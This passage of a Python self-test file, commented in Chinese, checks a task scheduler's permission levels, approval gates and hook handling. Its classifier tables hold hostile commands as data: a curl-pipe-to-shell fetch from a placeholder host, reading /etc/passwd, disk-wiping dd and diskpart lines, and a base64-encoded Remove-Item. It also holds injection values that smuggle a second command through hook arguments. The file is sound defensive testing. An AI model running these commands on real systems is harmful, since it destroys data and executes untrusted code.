#!/usr/bin/env python3
"""ATS 自测：覆盖三层实体的核心语义，供 CI 与本地验证使用。

用法：
    python tests/selftest.py            # 全部用例
    python tests/selftest.py -k task    # 只跑名字含 task 的用例

每个用例在独立的临时 ATS_ROOT 中运行，互不干扰，也不污染仓库。
标准库 only，退出码 0 表示全部通过。
"""
from __future__ import annotations

import base64
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import types
from pathlib import Path

sys.dont_write_bytecode = True
os.environ["PYTHONDONTWRITEBYTECODE"] = "1"

REPO = Path(__file__).resolve().parents[1]
ATS = REPO / "scripts" / "ats.py"
ATS_PLAN = REPO / "scripts" / "ats_plan.py"
GUARD = REPO / "scripts" / "ats_guard.py"
EXAMPLES = REPO / "references" / "examples"

DEAD_PID = 2147483647
TEST_PASSPHRASE = "ats-selftest-passphrase-2026"

CASES = []


def run_script(script, root, *args, timeout=90, passphrase=None):
    """用指定脚本路径跑一次（沙箱里可能有脚本副本，不能写死仓库路径）。

    passphrase 不为 None 时追加 --passphrase-stdin 并把口令从 stdin 送进去，
    与真实用法一致：口令不进 argv。
    """
    cmd = [sys.executable, str(script), "--root", str(root)] + [str(a) for a in args]
    stdin = None
    if passphrase is not None:
        cmd.append("--passphrase-stdin")
        stdin = passphrase + "\n"
    env = dict(os.environ)
    env["PYTHONIOENCODING"] = "utf-8"
    env["PYTHONUTF8"] = "1"
    env["PYTHONDONTWRITEBYTECODE"] = "1"
    proc = subprocess.run(cmd, input=stdin, capture_output=True, text=True, env=env,
                          encoding="utf-8", errors="replace", timeout=timeout)
    return proc.returncode, (proc.stdout or ""), (proc.stderr or "")


def init_and_seal(root, guard=None, passphrase=TEST_PASSPHRASE):
    """建密钥（若还没有）+ 封签，口令走 stdin。"""
    guard = Path(guard) if guard else GUARD
    key = Path(root) / "ats_guard_key.json"
    if not key.is_file():
        rc, out, err = run_script(guard, root, "init", "--confirm",
                                  passphrase=passphrase)
        if rc != 0:
            return rc, out, err
    return run_script(guard, root, "seal", "--confirm", passphrase=passphrase)


def case(fn):
    CASES.append(fn)
    return fn


class Sandbox:
    """一次用例的隔离环境：独立的 ATS_ROOT 与临时目录。"""

    def __init__(self):
        self.dir = Path(tempfile.mkdtemp(prefix="ats-selftest-"))
        self.root = self.dir / "root"
        self.auto_seal = True
        self.manifest = self.root / "ats_guard_manifest.json"

    def cleanup(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def seal(self):
        """给本沙箱重新封签：临时 root 的清单只对当前代码快照有效。"""
        init_and_seal(self.root)

    def guard(self, *args, timeout=60):
        return self._run(GUARD, *args, timeout=timeout)

    def ats(self, *args, timeout=90, passphrase=TEST_PASSPHRASE):
        return self._run(ATS, *args, timeout=timeout, passphrase=passphrase)

    def plan(self, *args, timeout=120, passphrase=TEST_PASSPHRASE):
        return self._run(ATS_PLAN, *args, timeout=timeout, passphrase=passphrase)

    def _run(self, script, *args, timeout, passphrase=TEST_PASSPHRASE):
        if self.auto_seal:
            self.seal()
        cmd = [sys.executable, str(script), "--root", str(self.root)] + [str(a) for a in args]
        stdin = None
        if passphrase is not None:
            cmd.append("--passphrase-stdin")
            stdin = passphrase + "\n"
        env = dict(os.environ)
        env["PYTHONIOENCODING"] = "utf-8"
        env["PYTHONUTF8"] = "1"
        env["PYTHONDONTWRITEBYTECODE"] = "1"
        proc = subprocess.run(cmd, input=stdin, capture_output=True, text=True, env=env,
                              encoding="utf-8", errors="replace", timeout=timeout)
        return proc.returncode, (proc.stdout or ""), (proc.stderr or "")

    def json_out(self, *args, **kw):
        return self._json(self.ats, *args, **kw)

    def json_out_plan(self, *args, **kw):
        return self._json(self.plan, *args, **kw)

    def _json(self, runner, *args, **kw):
        rc, out, err = runner(*args, **kw)
        try:
            return rc, json.loads(out)
        except json.JSONDecodeError:
            raise AssertionError("输出不是合法 JSON (rc=%s)\nstdout=%r\nstderr=%r" % (rc, out, err))

    def write_policy(self, data):
        self.root.mkdir(parents=True, exist_ok=True)
        (self.root / "policy.json").write_text(
            json.dumps(data, ensure_ascii=False), encoding="utf-8")


def expect(cond, msg):
    if not cond:
        raise AssertionError(msg)


# ---------------------------------------------------------------- 用例

@case
def task_lifecycle():
    """L0 任务：create -> run -> succeeded，退出码 0。"""
    sb = Sandbox()
    try:
        rc, task = sb.json_out("create", "hello", "--command", "echo hi", "--level", "L0")
        expect(rc == 0, "create 退出码应为 0，实际 %s" % rc)
        expect(task["task"]["status"] == "pending", "新建任务应为 pending")

        rc, run = sb.json_out("run", "hello", "--wait")
        expect(rc == 0, "run 退出码应为 0，实际 %s" % rc)

        rc, st = sb.json_out("status", "hello")
        expect(st["status"] == "succeeded", "任务应 succeeded，实际 %s" % st["status"])
        expect(st["exit_code"] == 0, "exit_code 应为 0，实际 %s" % st["exit_code"])
    finally:
        sb.cleanup()


@case
def task_failure_code():
    """命令非零退出时，任务 failed 且保留真实退出码。"""
    sb = Sandbox()
    try:
        code = 3
        sb.json_out("create", "boom", "--command",
                    '"%s" -c "import sys; sys.exit(%d)"' % (sys.executable, code),
                    "--level", "L0")
        sb.json_out("run", "boom", "--wait")
        rc, st = sb.json_out("status", "boom")
        expect(st["status"] == "failed", "应 failed，实际 %s" % st["status"])
        expect(st["exit_code"] == code, "exit_code 应回传 %d，实际 %s" % (code, st["exit_code"]))
    finally:
        sb.cleanup()


@case
def permission_denied_by_cap():
    """策略上限低于所需等级时直接拒绝：denied_policy，退出码 4。"""
    sb = Sandbox()
    try:
        sb.write_policy({"max_level": "L1", "actor_level": "L3"})
        sb.json_out("create", "risky", "--command", "echo nope", "--level", "L2")
        rc, out, err = sb.ats("run", "risky", "--wait")
        expect(rc == 4, "越权应退出 4，实际 %s\n%s%s" % (rc, out, err))
        payload = json.loads(out)
        expect(payload.get("error") == "denied_policy",
               "应报 denied_policy，实际 %r" % payload.get("error"))
    finally:
        sb.cleanup()


@case
def permission_needs_approval():
    """所需等级高于身份上限且未超策略上限时，挂起为 approval_required。"""
    sb = Sandbox()
    try:
        sb.write_policy({"max_level": "L3", "actor_level": "L1"})
        sb.json_out("create", "gated", "--command", "echo gated", "--level", "L2")
        rc, out, err = sb.ats("run", "gated", "--wait")
        expect(rc == 4, "待审批应退出 4，实际 %s\n%s%s" % (rc, out, err))
        payload = json.loads(out)
        expect(payload.get("error") == "approval_required",
               "应报 approval_required，实际 %r" % payload.get("error"))
        expect(payload.get("approval_id"), "应生成审批单号")
    finally:
        sb.cleanup()


@case
def plan_dependency_propagation():
    """依赖失败向下游传播：失败 1、级联跳过 2、独立分支照常成功 1。"""
    sb = Sandbox()
    try:
        spec = EXAMPLES / "plan-deps-retry.json"
        expect(spec.exists(), "缺少示例 %s" % spec)
        rc, sub = sb.json_out_plan("submit_plan", "--spec", spec)
        expect(rc == 0, "submit_plan 应成功，实际 %s" % rc)
        plan_id = sub["plan_id"]

        rc, run = sb.json_out_plan("run_plan", plan_id)
        expect(rc == 0, "run_plan 应正常返回，实际 %s" % rc)
        counts = run["counts"]
        expect(counts.get("failed") == 1, "应有 1 个 failed，实际 %r" % counts)
        expect(counts.get("skipped") == 2, "应有 2 个 skipped（级联），实际 %r" % counts)
        expect(counts.get("succeeded") == 1, "应有 1 个 succeeded（独立分支），实际 %r" % counts)
    finally:
        sb.cleanup()


@case
def plan_step_rejects_hook():
    """Plan 的 Step 不支持 @enc：提交阶段就报 hook_not_supported，不静默当普通参数。"""
    sb = Sandbox()
    try:
        spec = sb.dir / "plan-hook.json"
        spec.write_text(json.dumps({
            "id": "hookstep", "title": "t",
            "stages": [{"id": "s1", "mode": "serial", "steps": [
                {"id": "x", "command": "python -c \"print(1)\" @enc --from gbk --to utf-8 a.py",
                 "level": "L0", "timeout": 60}]}],
        }, ensure_ascii=False), encoding="utf-8")
        rc, payload = sb.json_out_plan("submit_plan", "--spec", spec)
        expect(rc == 2, "含 @enc 的 Step 应被拒（EXIT_USAGE），实际 %s\n%s" % (rc, payload))
        expect(payload.get("error") == "spec_invalid",
               "应报 spec_invalid，实际 %r" % payload.get("error"))
        errors = payload.get("errors") or []
        expect(any("hook_not_supported" in e for e in errors),
               "应含 hook_not_supported，实际 %r" % (errors,))
        expect(not (sb.root / "schedules" / "hookstep").exists(),
               "被拒时不应落盘 schedule")

        # 反向确认：不带 @enc 的同构 spec 仍可提交，说明拒绝只针对钩子写法
        spec.write_text(json.dumps({
            "id": "plainstep", "title": "t",
            "stages": [{"id": "s1", "mode": "serial", "steps": [
                {"id": "x", "command": "python -c \"print(1)\"", "level": "L0",
                 "timeout": 60}]}],
        }, ensure_ascii=False), encoding="utf-8")
        rc, payload = sb.json_out_plan("submit_plan", "--spec", spec)
        expect(rc == 0, "普通 Step 应能提交，实际 %s\n%s" % (rc, payload))
    finally:
        sb.cleanup()


@case
def supervisor_lost_is_detected():
    """supervisor 真死且无退出码时，仍判 supervisor_lost（不能被修复吞掉）。"""
    sb = Sandbox()
    try:
        sb.json_out("create", "lost", "--command", "echo x", "--level", "L0")
        p = sb.root / "tasks" / "lost" / "task.json"
        d = json.loads(p.read_text(encoding="utf-8"))
        d.update({"status": "running", "supervisor_pid": DEAD_PID,
                  "pid": DEAD_PID - 1, "finalized": False})
        p.write_text(json.dumps(d, ensure_ascii=False), encoding="utf-8")
        ec = sb.root / "tasks" / "lost" / "exit_code"
        if ec.exists():
            ec.unlink()

        rc, st = sb.json_out("status", "lost")
        raw = json.loads(p.read_text(encoding="utf-8"))
        expect(st["status"] == "failed", "应 failed，实际 %s" % st["status"])
        expect(raw.get("note") == "supervisor_lost",
               "应标记 supervisor_lost，实际 %r" % raw.get("note"))
    finally:
        sb.cleanup()


@case
def finished_task_not_misreported():
    """supervisor 已写退出码但进程已退出时，不得误判为 supervisor_lost。"""
    sb = Sandbox()
    try:
        sb.json_out("create", "race", "--command", "echo x", "--level", "L0")
        p = sb.root / "tasks" / "race" / "task.json"
        d = json.loads(p.read_text(encoding="utf-8"))
        d.update({"status": "running", "supervisor_pid": DEAD_PID,
                  "pid": DEAD_PID - 1, "finalized": False})
        p.write_text(json.dumps(d, ensure_ascii=False), encoding="utf-8")
        (sb.root / "tasks" / "race" / "exit_code").write_text("0", encoding="utf-8")

        rc, st = sb.json_out("status", "race")
        expect(st["status"] == "succeeded", "应 succeeded，实际 %s" % st["status"])
        expect(st["exit_code"] == 0, "exit_code 应为 0，实际 %s" % st["exit_code"])
    finally:
        sb.cleanup()


@case
def dead_pid_probe_survives_encoding():
    """已退出/不存在的 PID：pid_alive 返回 False，taskkill/tasklist 输出不得解码崩溃。

    Windows 的 taskkill/tasklist 输出是控制台 OEM 编码；在 PYTHONUTF8=1 下用
    text=True 解码会抛 UnicodeDecodeError，而「进程已退出」正是主用例。
    """
    code = (
        "import sys\n"
        "sys.path.insert(0, %r)\n"
        "import ats\n"
        "print(ats.pid_alive(%d))\n"
        "print(ats.kill_pid(%d))\n"
    ) % (str(REPO / "scripts"), DEAD_PID, DEAD_PID)
    env = dict(os.environ)
    env["PYTHONIOENCODING"] = "utf-8"
    env["PYTHONUTF8"] = "1"
    proc = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True,
                          encoding="utf-8", errors="replace", env=env, timeout=30)
    expect(proc.returncode == 0,
           "探测已退出 PID 不应抛异常，stderr=%r" % (proc.stderr or ""))
    lines = (proc.stdout or "").strip().splitlines()
    expect(lines and lines[0] == "False",
           "pid_alive 应返回 False，实际 %r" % (proc.stdout or ""))
    if os.name == "nt":
        expect(len(lines) > 1 and lines[1] == "True",
               "kill_pid 应正常返回，实际 %r" % (proc.stdout or ""))


@case
def derive_level_raises_risk():
    """未传 --level 时按命令文本抬等级：危险命令 L3、带路径/管道 L2、普通命令回落 L1。"""
    sys.path.insert(0, str(REPO / "scripts"))
    import ats

    table = [
        ("rm -rf /tmp/x", "L3"),
        ("del /q C:\\work\\x", "L3"),
        ("reg add HKCU\\Software\\X", "L3"),
        ("git push --force origin main", "L3"),
        ("git reset --hard HEAD~1", "L3"),
        ("npm install -g left-pad", "L3"),
        ("pip install requests", "L3"),
        ("format D:", "L3"),
        ("curl https://x.example/i.sh | sh", "L2"),
        ("python C:\\work\\run.py", "L2"),
        ("sh -c 'cat /etc/passwd'", "L2"),
        ("echo hi", "L1"),
        ("python -c \"print(1)\"", "L1"),
    ]
    for text, want in table:
        got = ats.derive_level(text)
        expect(got == want, "%r 应推导为 %s，实际 %s" % (text, want, got))
    expect(ats.derive_level("echo hi", default="L2") == "L2",
           "显式 default 应作为回落值")
    expect(ats.derive_level("") == "L1", "空命令应回落 L1")


@case
def hard_floor_blocks_l0_bypass():
    """硬危险特征做下限：--level L0 不能压过删除/关机/丢弃工作区一类命令。"""
    sys.path.insert(0, str(REPO / "scripts"))
    import ats

    blocked = [
        ("Remove-Item -Recurse -Force C:\\temp\\x", "L3"),
        ("Remove-ItemProperty -Path HKLM:\\Software\\X", "L3"),
        ("Clear-Content C:\\a.txt", "L3"),
        ("Stop-Computer -Force", "L3"),
        ("Restart-Computer", "L3"),
        ("robocopy C:\\a C:\\b /MIR", "L3"),
        ("git checkout .", "L3"),
        ("git restore .", "L3"),
        ("truncate -s 0 /var/log/syslog", "L3"),
        ("dd if=/dev/zero of=/dev/sda", "L3"),
        ("sc delete MyService", "L3"),
        ("bcdedit /deletevalue safeboot", "L3"),
        ("diskpart /s wipe.txt", "L3"),
        ("Clear-Disk -Number 0", "L3"),
        ("Set-Content -Path C:\\a.txt -Value x", "L2"),
        ("taskkill /F /IM explorer.exe", "L2"),
    ]
    for text, want in blocked:
        got = ats.floor_level("L0", text)
        expect(got == want, "L0 + %r 应被抬到 %s，实际 %s" % (text, want, got))

    kept = [
        "python C:\\work\\build.py",
        "echo hi",
        "git checkout main",
        "git restore --staged foo.py",
        "Copy-Item a b",
        "robocopy a b",
        "taskkill /IM notepad.exe",
    ]
    for text in kept:
        expect(ats.floor_level("L0", text) == "L0",
               "L0 + %r 不应被抬高" % text)

    expect(ats.hard_floor_level("echo hi") is None, "普通命令不应有硬下限")


@case
def pack_level_respects_hard_floor():
    """pack 登记等级不得被 --level L0 压低到硬下限以下。"""
    sys.path.insert(0, str(REPO / "scripts"))
    import ats

    expect(ats.pack_level("L0", ["Set-Content a.txt hi"]) == "L2",
           "pack L0 + Set-Content 应登记 L2")
    expect(ats.pack_level("L0", ["taskkill /F /IM explorer.exe"]) == "L2",
           "pack L0 + taskkill /F 应登记 L2")
    expect(ats.pack_level("L0", ["Set-Content a.txt hi", "echo hi"]) == "L2",
           "包内安全命令不得稀释危险命令的下限")
    expect(ats.pack_level("L0", ["git checkout ."]) == "L3",
           "pack L0 + git checkout . 应登记 L3")
    expect(ats.pack_level("L0", ["python build.py"]) == "L1",
           "安全命令保持推导默认值 L1")
    expect(ats.pack_level(None, ["echo hi"]) == "L1", "未传等级时回落 L1")


@case
def hook_args_do_not_run_through_shell():
    """`@enc` 参数只以 argv 交给转换器：参数里的 `;` 不得变成第二条命令。

    修复前 run_post_hook 用 shell=True 拼字符串执行，`echo hi @enc x; copy nul f`
    会让主命令 L0 直通、钩子段却执行任意 shell —— 权限门与预检全程没看见。
    """
    sb = Sandbox()
    old = os.environ.get("ATS_ENCODER_PATH")
    try:
        tools = sb.dir / "tools"
        tools.mkdir(parents=True, exist_ok=True)
        (tools / "encoding_converter.py").write_text(
            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")

        sb.json_out("create", "hook", "--cwd", str(sb.dir), "--level", "L0",
                    "--command", "echo hi @enc x; copy nul PWN.txt")
        rc, run = sb.json_out("run", "hook", "--wait")
        expect(rc == 0, "L0 任务应放行，实际退出 %s" % rc)
        rc, st = sb.json_out("status", "hook")
        expect(st["status"] == "succeeded", "任务应 succeeded，实际 %s" % st["status"])
        rec = json.loads((sb.root / "tasks" / "hook" / "task.json").read_text(encoding="utf-8"))
        expect((rec.get("post_hook") or {}).get("status") == "ok",
               "钩子应 ok，实际 %r" % (rec.get("post_hook") or {}).get("status"))
        expect(not (sb.dir / "PWN.txt").exists(),
               "钩子参数被 shell 解释了：PWN.txt 被创建")
        log = Path(rec["post_hook"]["log"]).read_text(encoding="utf-8", errors="replace")
        expect("copy" in log and "nul" in log,
               "转换器应以 argv 收到参数，实际日志 %r" % log)
    finally:
        if old is None:
            os.environ.pop("ATS_ENCODER_PATH", None)
        else:
            os.environ["ATS_ENCODER_PATH"] = old
        sb.cleanup()


@case
def hook_args_enter_gate_text():
    """钩子参数参与等级推导，也进审批绑定文本：不能搭 L0 主命令的车。"""
    sb = Sandbox()
    try:
        rc, task = sb.json_out("create", "hookrisk", "--level", "L0",
                               "--command", "echo hi @enc x; del PWN.txt")
        expect(rc == 0, "create 退出码应为 0，实际 %s" % rc)
        expect(task["task"]["level"] == "L3",
               "钩子参数含 del 应登记 L3，实际 %s" % task["task"]["level"])
        rc, out, err = sb.ats("run", "hookrisk", "--wait")
        expect(rc == 4, "L3 任务应挂起待审批，实际退出 %s\n%s%s" % (rc, out, err))
        payload = json.loads(out)
        expect(payload.get("error") == "approval_required",
               "应报 approval_required，实际 %r" % payload.get("error"))
        expect("@enc" in (payload.get("approval") or {}).get("command", ""),
               "审批应绑定含 @enc 参数的完整原文，实际 %r"
               % (payload.get("approval") or {}).get("command"))
    finally:
        sb.cleanup()


@case
def hook_args_decoded_payload_raises_level():
    """@enc 参数里的编码载荷也要解码：钩子段写 -EncodedCommand 同样抬到 L3。"""
    sb = Sandbox()
    try:
        blob = base64.b64encode(
            "Remove-Item -Recurse -Force C:\\tmp\\x".encode("utf-16-le")).decode()
        rc, task = sb.json_out(
            "create", "hookb64", "--level", "L0", "--command",
            "echo hi @enc --from gbk --to utf-8 powershell -EncodedCommand " + blob)
        expect(rc == 0, "create 退出码应为 0，实际 %s" % rc)
        expect(task["task"]["level"] == "L3",
               "钩子段编码载荷解出 Remove-Item 后应登记 L3，实际 %s"
               % task["task"]["level"])
        expect(task["task"]["command"] == "echo hi",
               "主命令应只剩 echo hi，实际 %r" % task["task"]["command"])
        expect("-EncodedCommand" in (task["task"].get("post_hook") or {}).get("args", ""),
               "钩子参数应原样保留在 post_hook，实际 %r" % task["task"].get("post_hook"))
    finally:
        sb.cleanup()


@case
def hook_glob_expands_multiple_files():
    """`@enc` 的通配路径由 ATS 自己展开（钩子不经 shell），一条钩子覆盖多个文件。"""
    sb = Sandbox()
    old = os.environ.get("ATS_ENCODER_PATH")
    try:
        tools = sb.dir / "tools"
        tools.mkdir(parents=True, exist_ok=True)
        (tools / "encoding_converter.py").write_text(
            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")
        logs = sb.dir / "logs"
        logs.mkdir(parents=True, exist_ok=True)
        for name in ("a.log", "b.log", "c.log"):
            (logs / name).write_text("x", encoding="utf-8")

        sb.json_out("create", "glob1", "--cwd", str(sb.dir), "--level", "L0",
                    "--command", "echo hi @enc --from gbk --to utf-8 logs/*.log")
        rc, run = sb.json_out("run", "glob1", "--wait")
        expect(rc == 0, "任务应放行，实际退出 %s" % rc)
        rec = json.loads((sb.root / "tasks" / "glob1" / "task.json").read_text(encoding="utf-8"))
        hook = rec.get("post_hook") or {}
        expect(hook.get("status") == "ok", "钩子应 ok，实际 %r" % hook.get("status"))
        expect(hook.get("expanded") == 3, "应展开 3 个文件，实际 %r" % hook.get("expanded"))
        expect(hook.get("glob") == "logs/*.log", "应记录通配原文，实际 %r" % hook.get("glob"))
        runs = hook.get("runs") or []
        expect(len(runs) == 3, "应逐条调用 3 次，实际 %d 次" % len(runs))
        expect(all(r["exit_code"] == 0 for r in runs),
               "三次调用都应成功，实际 %r" % runs)
        names = [Path(r["path"]).name for r in runs]
        expect(names == ["a.log", "b.log", "c.log"],
               "展开顺序应按字典序，实际 %r" % names)
        log = Path(hook["log"]).read_text(encoding="utf-8", errors="replace")
        expect("glob logs/*.log -> 3 path(s)" in log, "日志头应记录展开清单，实际 %r" % log[:200])
        expect(log.count("ARGV") == 3, "转换器应被调用 3 次，实际日志 %r" % log)
    finally:
        if old is None:
            os.environ.pop("ATS_ENCODER_PATH", None)
        else:
            os.environ["ATS_ENCODER_PATH"] = old
        sb.cleanup()


@case
def hook_glob_no_match_fails_loudly():
    """通配 0 匹配必须报错：绝不能把字面量 `*.log` 当文件名交给转换器。"""
    sb = Sandbox()
    old = os.environ.get("ATS_ENCODER_PATH")
    try:
        tools = sb.dir / "tools"
        tools.mkdir(parents=True, exist_ok=True)
        (tools / "encoding_converter.py").write_text(
            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")

        sb.json_out("create", "glob0", "--cwd", str(sb.dir), "--level", "L0",
                    "--command", "echo hi @enc --from gbk --to utf-8 missing/*.log")
        rc, run = sb.json_out("run", "glob0", "--wait")
        rc, st = sb.json_out("status", "glob0")
        expect(st["status"] == "failed", "无匹配时任务应 failed，实际 %s" % st["status"])
        rec = json.loads((sb.root / "tasks" / "glob0" / "task.json").read_text(encoding="utf-8"))
        hook = rec.get("post_hook") or {}
        expect(hook.get("error_type") == "hook_glob_no_match",
               "应报 hook_glob_no_match，实际 %r" % hook.get("error_type"))
        log = Path(hook["log"]).read_text(encoding="utf-8", errors="replace")
        expect("hook_glob_no_match" in log, "日志应写明原因，实际 %r" % log)
        expect("ARGV" not in log, "无匹配时不应调用转换器，实际 %r" % log)
    finally:
        if old is None:
            os.environ.pop("ATS_ENCODER_PATH", None)
        else:
            os.environ["ATS_ENCODER_PATH"] = old
        sb.cleanup()


@case
def hook_glob_rejects_mixed_paths():
    """通配路径与手写路径同时出现含义不明，直接拒绝而不是猜。"""
    sb = Sandbox()
    old = os.environ.get("ATS_ENCODER_PATH")
    try:
        tools = sb.dir / "tools"
        tools.mkdir(parents=True, exist_ok=True)
        (tools / "encoding_converter.py").write_text(
            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")
        (sb.dir / "a.txt").write_text("x", encoding="utf-8")

        sb.json_out("create", "globamb", "--cwd", str(sb.dir), "--level", "L0",
                    "--command", "echo hi @enc a.txt *.txt")
        sb.json_out("run", "globamb", "--wait")
        rec = json.loads((sb.root / "tasks" / "globamb" / "task.json").read_text(encoding="utf-8"))
        hook = rec.get("post_hook") or {}
        expect(hook.get("error_type") == "hook_glob_ambiguous",
               "应报 hook_glob_ambiguous，实际 %r" % hook.get("error_type"))
        expect("ARGV" not in Path(hook["log"]).read_text(encoding="utf-8", errors="replace"),
               "歧义时不应调用转换器")
    finally:
        if old is None:
            os.environ.pop("ATS_ENCODER_PATH", None)
        else:
            os.environ["ATS_ENCODER_PATH"] = old
        sb.cleanup()


@case
def hook_glob_skips_flag_values():
    """flag 的值即使含 `*` 也不展开：`--include *.log` 必须原样传给转换器。"""
    sb = Sandbox()
    old = os.environ.get("ATS_ENCODER_PATH")
    try:
        tools = sb.dir / "tools"
        tools.mkdir(parents=True, exist_ok=True)
        (tools / "encoding_converter.py").write_text(
            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")
        (sb.dir / "x.log").write_text("x", encoding="utf-8")

        sb.json_out("create", "globflag", "--cwd", str(sb.dir), "--level", "L0",
                    "--command", "echo hi @enc --from gbk --to utf-8 --include *.log")
        sb.json_out("run", "globflag", "--wait")
        rec = json.loads((sb.root / "tasks" / "globflag" / "task.json").read_text(encoding="utf-8"))
        hook = rec.get("post_hook") or {}
        expect(hook.get("status") == "ok", "钩子应 ok，实际 %r" % hook.get("status"))
        expect(not hook.get("expanded"), "flag 值不应被展开，实际 %r" % hook.get("expanded"))
        log = Path(hook["log"]).read_text(encoding="utf-8", errors="replace")
        expect("*.log" in log, "字面量应原样传给转换器，实际 %r" % log)
        expect("glob " not in log, "不应写展开头，实际 %r" % log)
    finally:
        if old is None:
            os.environ.pop("ATS_ENCODER_PATH", None)
        else:
            os.environ["ATS_ENCODER_PATH"] = old
        sb.cleanup()


@case
def hook_glob_survives_valueless_flags():
    """无值开关（`--dry-run`）排在通配之前也不影响展开：`-` 开头的 token 永不当值。"""
    sb = Sandbox()
    old = os.environ.get("ATS_ENCODER_PATH")
    try:
        tools = sb.dir / "tools"
        tools.mkdir(parents=True, exist_ok=True)
        (tools / "encoding_converter.py").write_text(
            "import sys\nprint('ARGV', sys.argv[1:])\n", encoding="utf-8")
        os.environ["ATS_ENCODER_PATH"] = str(tools / "encoding_converter.py")
        logs = sb.dir / "logs"
        logs.mkdir(parents=True, exist_ok=True)
        for name in ("a.log", "b.log"):
            (logs / name).write_text("x", encoding="utf-8")

        sb.json_out("create", "globflag2", "--cwd", str(sb.dir), "--level", "L0",
                    "--command", "echo hi @enc --dry-run --from gbk --to utf-8 logs/*.log")
        sb.json_out("run", "globflag2", "--wait")
        rec = json.loads((sb.root / "tasks" / "globflag2" / "task.json").read_text(encoding="utf-8"))
        hook = rec.get("post_hook") or {}
        expect(hook.get("status") == "ok",
               "钩子应 ok，实际 %r / %r" % (hook.get("status"), hook.get("error_type")))
        expect(hook.get("expanded") == 2, "应展开 2 个文件，实际 %r" % (hook.get("expanded"),))
        log = Path(hook["log"]).read_text(encoding="utf-8", errors="replace")
        expect(log.count("ARGV") == 2, "转换器应被调用 2 次，实际 %r" % log[:200])
        expect("--dry-run" in log, "开关应原样传给转换器，实际 %r" % log[:200])
    finally:
        if old is None:
            os.environ.pop("ATS_ENCODER_PATH", None)
        else:
            os.environ["ATS_ENCODER_PATH"] = old
        sb.cleanup()


def _download_args(**kw):
    """构造 `download` 子命令的 argparse 结果，用来直接调 `_build_download_spec`。"""
    base = dict(name=None, url=[], file=[], out=None, sha256=None, size=None,
                header=[], proxy=None, concurrency=2, rate=0, retry=2,
                backoff=3, io_timeout=30, no_resume=False, overwrite=False,
                insecure=False)
    base.update(kw)
    return types.SimpleNamespace(**base)


@case
def download_manifest_glob_merges():
    """`--file` 支持通配：多个清单一次读入并合并，重复条目照旧去重。"""
    sb = Sandbox()
    try:
        sys.path.insert(0, str(REPO / "scripts"))
        import ats

        mdir = sb.dir / "manifests"
        mdir.mkdir(parents=True, exist_ok=True)
        (mdir / "a.txt").write_text(
            "https://example.com/a.bin\nhttps://example.com/shared.bin\n", encoding="utf-8")
        (mdir / "b.csv").write_text(
            "url,save_as\nhttps://example.com/b.bin,b.bin\n"
            "https://example.com/shared.bin\n", encoding="utf-8")

        spec, err = ats._build_download_spec(
            _download_args(file=[str(mdir / "*.txt"), str(mdir / "*.csv")]))
        expect(err is None, "通配清单应能合并，实际错误 %r" % (err,))
        expect(len(spec["items"]) == 3, "去重后应剩 3 条，实际 %d" % len(spec["items"]))
        expect(spec.get("deduped") == 1, "应记 1 条重复，实际 %r" % spec.get("deduped"))
        expect([Path(p).name for p in spec["manifests"]] == ["a.txt", "b.csv"],
               "展开结果应按字典序，实际 %r" % (spec["manifests"],))

        literal, err2 = ats._build_download_spec(_download_args(file=[str(mdir / "a.txt")]))
        expect(err2 is None, "字面清单路径应照旧可用，实际错误 %r" % (err2,))
        expect(len(literal["items"]) == 2, "字面清单应读到 2 条，实际 %d" % len(literal["items"]))
    finally:
        sb.cleanup()


@case
def download_manifest_glob_no_match():
    """通配清单 0 匹配必须报错：不能把字面量 `*.txt` 当成真实文件名。"""
    sb = Sandbox()
    try:
        sys.path.insert(0, str(REPO / "scripts"))
        import ats

        spec, err = ats._build_download_spec(
            _download_args(file=[str(sb.dir / "missing" / "*.txt")]))
        expect(err is not None and err.startswith("manifest_no_match:"),
               "应报 manifest_no_match，实际 %r" % (err,))
        missing, err2 = ats._build_download_spec(
            _download_args(file=[str(sb.dir / "nope.txt")]))
        expect(err2 is not None and err2.startswith("manifest_not_found:"),
               "字面路径缺失应报 manifest_not_found，实际 %r" % (err2,))
    finally:
        sb.cleanup()


@case
def download_manifest_outputs_conflict():
    """多个清单给出不同 outputs 且没写 --out 时拒绝，不猜用哪一个。"""
    sb = Sandbox()
    try:
        sys.path.insert(0, str(REPO / "scripts"))
        import ats

        mdir = sb.dir / "manifests"
        mdir.mkdir(parents=True, exist_ok=True)
        for name, out, url in (("1.json", sb.dir / "out1", "https://example.com/1.bin"),
                               ("2.json", sb.dir / "out2", "https://example.com/2.bin")):
            (mdir / name).write_text(json.dumps(
                {"outputs": str(out), "items": [{"url": url}]}), encoding="utf-8")

        spec, err = ats._build_download_spec(_download_args(file=[str(mdir / "*.json")]))
        expect(err is not None and err.startswith("manifest_outputs_conflict:"),
               "outputs 冲突应拒绝，实际 %r" % (err,))

        ok, err2 = ats._build_download_spec(
            _download_args(file=[str(mdir / "*.json")], out=str(sb.dir / "out")))
        expect(err2 is None, "写了 --out 就应以它为准，实际 %r" % (err2,))
        expect(Path(ok["outputs"]) == (sb.dir / "out").resolve(),
               "outputs 应取 --out，实际 %r" % ok["outputs"])
        expect(len(ok["items"]) == 2, "两份清单应各贡献 1 条，实际 %d" % len(ok["items"]))
    finally:
        sb.cleanup()


@case
def whitelist_does_not_bypass_hard_floor():
    """白名单不得穿透硬下限：危险命令即使命中 allow_rules 也要走审批。"""
    sb = Sandbox()
    try:
        sys.path.insert(0, str(REPO / "scripts"))
        import ats

        sb.write_policy({"allow_rules": ["^git"]})
        root = str(sb.root)

        for cmd in ("git checkout .", "git restore .", "git reset --hard HEAD~1"):
            gate = ats.permission_gate(root, cmd, None, {"required_level": "L0"})
            expect(gate["required_level"] == "L3",
